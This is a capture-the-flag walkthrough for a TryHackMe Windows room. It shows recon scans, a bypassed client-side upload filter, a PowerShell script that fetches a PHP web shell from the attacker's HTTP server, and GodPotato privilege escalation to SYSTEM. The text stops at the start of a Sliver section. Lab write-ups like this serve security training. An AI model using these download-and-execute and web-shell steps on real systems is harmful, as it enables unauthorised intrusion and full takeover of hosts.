## üß© Overview  

**Objective:**  
This guide walks through solving the Stealth room. This challenge involves initial exploitation of a web upload vulnerability. Once initial access has been gained privilege escalation is achieved via exploiting the SeImpersonatePrivilege to gain full administrator access.
This rooms initial access portion challenged me, and I had to get some guidance to understand the correct approach, it looked like a simple upload vulnerability at first but needed some clever tricks to take full advantage of. Once initial access had been gained I had wanted to create a sliver session with GodPotato to escalate my privileges but ran into issues with my Sliver `NT AUTHORITY\SYSTEM` shell constantly breaking, as such I reverted to a different tactic. I have kept the Sliver details in the guide to show my thought process.

Firstly, let‚Äôs start our target machine and give it a few minutes to start all relevant services. We can also either start the AttackBox or as in my case connect our own machine to the TryHackMe VPN.  If needed, you can add ```stealth.thm``` along with the assigned IP to your ```/etc/hosts``` file which can make life easier than remembering an IP all the time.  

---

## üõ†Ô∏è Recon & Enumeration 

As always, I started out with some simple port and directory scans against the target. Even though the room indicates we need to start at port `8080` in our browser, it is always good to get a lay of the land regarding other running services and open ports.   

I ran RustScan as shown below.  
```bash
rustscan -a stealth.thm -- -A
```
#### ‚öôÔ∏è **Options**   
**-a** Use to list the IPs, CIDRs or hosts to be scanned.  
**-A** Passes the IP and open ports to nmap to perform a full `-A` nmap scan.   
Note that we need to add the double dash `--` after the IP to tell RustScan that the following arguments should be passed to nmap. In this instance `-A`  

The result returned alof of information, some of which I have taken out to clean up the output.  
```js

49671/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
```
The main items to note for the challenge here are  
- RDP on port `3389`  
- HTTP on port `8080`  
- HTTP on port `8000`

And the computer name `HostEvasion` which can be added to our `/etc/hosts` file.  

Next, I ran dirsearch against the target as below. 
```bash
dirsearch -u http://stealth.thm:8080   
```
#### ‚öôÔ∏è **Options**   
**-u** Use to list the IPs, CIDRs or hosts to be scanned.  
Note that dirsearch has a default wordlist that will be used if no specific wordlist is provided. This wordlist is comparable to notable lists in finding directories.  


```js
[12:14:29] 301 -  344B  - /uploads  ->  http://stealth.thm:8080/uploads/    
[12:14:29] 200 -    0B  - /uploads/
```
This just gave us one new directory of `/uploads` 

I did run a few other scans via ffuf but this did not turn up anything new.  

Now we can check `http://stealth:8080` via our browser. Here we are presented with a basic file upload box, which mentions only `.ps1` files can be loaded and their contents will be scanned.  
![Recon - website.png](./Images/Recon%20-%20website.png)  

I firstly just loaded a simple file with `Hello World` and tried to view what is happening with Caido.  
```bash
echo "Hello World" > file.ps1
```
This could be uploaded without error and when I navigated to `/uploads/file.ps1` the output was returned in the servers HTTP response.  
![Recon - Caido.png](./Images/Recon%20-%20Caido.png)  

At this stage I attempted up upload simple commands like `/whoami` but everything the content of my file was just being output back to be in the HTTP response. I then turned to try bypass the `.ps1` filter and upload a PHP reverse shell.  
I was successfully able to bypass the filter as it was only employing Client-Side filtering which was easily bypassed by editing my upload request in Caido. 

This still did not provide me with any luck, and this is where I got stuck and had to do some research as to how others managed to gain initial access.  

---

## üõ†Ô∏è Initial Access

After some research what I learnt was that the contents of the `.ps1` files being uploaded was being scanned and then also executed with the results being blind. Other users where able to quite cleverly I thought get simple commands to execute, have the output sent back to their attacking machine in the body of a HTTP POST. This request as captured via a netcat listener. 

The big trick I was missing is that because the `.ps1` files are being executed, we can use them to copy a web shell onto the target in the `C:\xampp\htdocs\` directory.

Firstly, I needed to download a copy of a web shell, and I used the one here - [P0wny-shell](https://github.com/flozz/p0wny-shell/tree/master)  

Now I needed to create a `.ps1` file to load the web shell onto the target.
```powershell
$url = "http://10.4.12.97:5050/shell.php"
$localPath = "C:\xampp\htdocs\shell.php"
Invoke-WebRequest -Uri $url -OutFile $localPath
```
This sets the location of the `shell.php` file to download as the `$url` parameter and the output location and name of the file as the `$localPath` parament and then issues `Invoke-WebRequest` to grab the file.  

Before uploading our `.ps1` file we need to start a HTTP server to allow the target to download the webshell file.
```bash
python3 -m http.server 5050
Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
10.201.36.254 - - [01/Oct/2025 20:23:01] "GET /shell.php HTTP/1.1" 200 -
```
If everything was setup correctly the web shell file should have been loaded onto the target.  

As a quick summary what is happening here is we create a `.ps1` file say called `shellloader.ps1` and another file for our web shell called `shell.php` we then upload `shellloader.ps1` to the website which is scanned and executed. When this executes it downloads the `shell.php` file and saves it in `C:\xampp\htdocs\shell.php` we can then navigate directly to the `shell.php` location in the browser and gain web shell access to the target.  

![Initial Access.png](./Images/Initial%20Access.png)  

Once on the target we can see that we are the user `evader` on `HostEvasion`  

I undertook some simple recon here to determine privileges and before looking for the user flag decided to move onto privilege escalation as our user had the `SeImpersonatePrivilege` which can be quickly abused via different Potato attacks.  

---

## üõ†Ô∏è Privilege Escalation

First we need to select our chosen potato and in my case, I went with GodPotato found here: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) I downloaded the `GodPotato-Net4.exe` to match the target system.  
Once downloaded I renamed the file and made it executable
```bash
mv GodPotato-NET4.exe potato.exe
chmod +x Potato.exe
```
Now we can transfer this file to the target via the web shell and a HTTP server on our machine.  
```bash
evader@HostEvasion:C:\xampp\htdocs# powershell wget http://10.4.12.97:5050/potato.exe -outfile potato.exe
```
```bash
python3 -m http.server 5050     
Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
10.201.104.177 - - [03/Oct/2025 20:26:07] "GET /potato.exe HTTP/1.1" 200 -
```

Now we can execute a simple test `whoami` to confirm we can use GodPotato to escalate via the following syntax `.\potato.exe -cmd "cmd /c whoami"`
```
evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140704725794816
Removed for brevity
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2252
```
Success we can execute commands as `NT AUTHORITY\SYSTEM`

At this stage my plan was to use GodPotato to execute a Sliver implant on the target and gain a Sliver session as `NT AUTHORITY\SYSTEM` which ultimately did not work out as planned. Hence why I pivoted to creating a new user in the admin group and logging in via RDP.    

### üõ∞Ô∏è Sliver Method

Here I briefly detail the steps I took to gain a Silver session as `NT AUTHORITY\SYSTEM` on the target and the issues I ran into. If you just want to get the flags and complete the challenge you can view the **User Creation and RDP Method**
